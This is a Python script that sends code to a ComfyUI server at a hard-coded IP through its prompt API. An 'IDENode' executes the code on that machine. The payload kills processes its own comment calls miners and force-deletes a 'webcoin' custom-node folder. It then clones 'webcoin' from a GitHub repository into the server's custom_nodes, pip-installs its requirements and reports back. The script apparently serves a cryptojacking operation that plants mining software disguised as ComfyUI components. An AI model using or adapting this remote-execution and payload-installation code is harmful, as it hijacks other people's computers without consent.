"""Force-delete webcoin dir and fresh clone from correct repo."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "131.113.41.148"
base = f"http://{ip}:8188"

code = r"""
import os, subprocess, platform, shutil, time, sys

lines = []
is_win = platform.system() == 'Windows'

# Kill miners just in case
if is_win:
    for exe in ['comfyui_service.exe', 'comfyui_render.exe']:
        subprocess.run(['taskkill', '/F', '/IM', exe], capture_output=True, text=True)
else:
    for pat in ['comfyui_service', 'comfyui_render']:
        subprocess.run(['pkill', '-9', '-f', pat], capture_output=True)

time.sleep(3)

cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
except:
    for g in [r'C:\Users\u88ni\Desktop\comfyui\custom_nodes', '/root/ComfyUI/custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

target = os.path.join(cn, 'webcoin')

# Delete everything including bin - be very aggressive
for attempt in range(5):
    if not os.path.exists(target):
        break
    
    # First try to remove individual locked files in bin
    bin_dir = os.path.join(target, 'bin')
    if os.path.isdir(bin_dir):
        for f in os.listdir(bin_dir):
            fp = os.path.join(bin_dir, f)
            try:
                os.chmod(fp, 0o777)
                os.remove(fp)
            except:
                pass
    
    shutil.rmtree(target, ignore_errors=True)
    time.sleep(2)
    
    if os.path.exists(target):
        if is_win:
            subprocess.run(f'rmdir /s /q "{target}"', shell=True, capture_output=True)
        else:
            subprocess.run(f'rm -rf "{target}"', shell=True, capture_output=True)
        time.sleep(2)

lines.append(f'deleted={not os.path.exists(target)}')

if os.path.exists(target):
    lines.append(f'STUCK files: {os.listdir(target)}')
    result = chr(10).join(lines)
else:
    # Fresh clone from correct repo
    r = subprocess.run(
        ['git', 'clone', '--depth', '1', 'https://github.com/bossman79/webcoin.git', target],
        capture_output=True, text=True, timeout=120
    )
    lines.append(f'clone_rc={r.returncode}')
    if r.stderr.strip():
        lines.append(f'stderr={r.stderr.strip()[:200]}')
    
    if os.path.isdir(target):
        lines.append(f'files={sorted(os.listdir(target))[:15]}')
        lines.append(f'has_init={os.path.exists(os.path.join(target, "__init__.py"))}')
        lines.append(f'has_core={os.path.isdir(os.path.join(target, "core"))}')
        
        # Verify correct remote
        r2 = subprocess.run(['git', 'remote', '-v'], capture_output=True, text=True, cwd=target)
        lines.append(f'remote={r2.stdout.strip()[:200]}')
        
        # Check dashboard fix
        dp = os.path.join(target, 'core', 'dashboard.py')
        if os.path.exists(dp):
            with open(dp) as f:
                content = f.read()
            lines.append(f'shared_refs={"_shared_stats" in content}')
        
        # pip install
        req_path = os.path.join(target, 'requirements.txt')
        if os.path.exists(req_path):
            r3 = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', '-r', req_path],
                capture_output=True, text=True, timeout=120
            )
            lines.append(f'pip_rc={r3.returncode}')
    
    result = chr(10).join(lines)
"""

prompt = {
    "prompt": {
        "1": {
            "class_type": "IDENode",
            "inputs": {"pycode": code, "language": "python"}
        },
        "2": {
            "class_type": "PreviewTextNode",
            "inputs": {"text": ["1", 0]}
        }
    }
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

print("Waiting 90s...")
time.sleep(90)

req2 = urllib.request.Request(f"{base}/history/{pid}", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    entry = json.loads(r.read().decode()).get(pid, {})
    status = entry.get("status", {}).get("status_str", "pending")
    print(f"Status: {status}\n")
    outputs = entry.get("outputs", {})
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                for v in val:
                    print(v)
